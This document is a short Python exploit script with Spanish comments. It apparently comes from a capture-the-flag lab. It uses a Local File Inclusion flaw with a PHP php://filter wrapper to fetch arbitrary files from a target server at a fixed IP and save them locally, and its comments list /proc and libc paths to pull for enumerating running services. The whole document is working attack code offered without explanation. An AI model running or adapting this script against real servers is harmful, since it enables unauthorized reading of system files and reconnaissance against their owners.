import requests
from  pathlib import Path
import base64
import sys
##
## Este script nos ayudara a obtener informacion sobre los servicios que estan corriendo 
## en el servidor vulnerable con ayuda de el LFI (Local File Inclusion encontrado)
## NOTA: Solo sirve para envolturas PHP
## Author : Juan Duque

#/proc/sched_debug
#/proc/<<PID>>/maps
#/usr/lib/x86_64-linux-gnu/libc-2.31.so
#/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6

def get_data(sys):
	plaint_text = "php://filter/read=string/resource="
	remote_file  = sys.argv[1]
	result  = requests.get(f"http://10.10.11.154/index.php?page={plaint_text}{remote_file}")
	return result

def _init_(sys):
	if len(sys.argv) < 2:
		print("Ingresa el file descriptor a ver")
	else:
		print("Obteniendo informacion de archivo\n")
		print(f"\n\t [!] Tu archivo \t {sys.argv[1]}")
	r = get_data(sys)
	with open("content", "w") as file:
		file.write(r.text)

if __name__ == "__main__":
	_init_(sys)
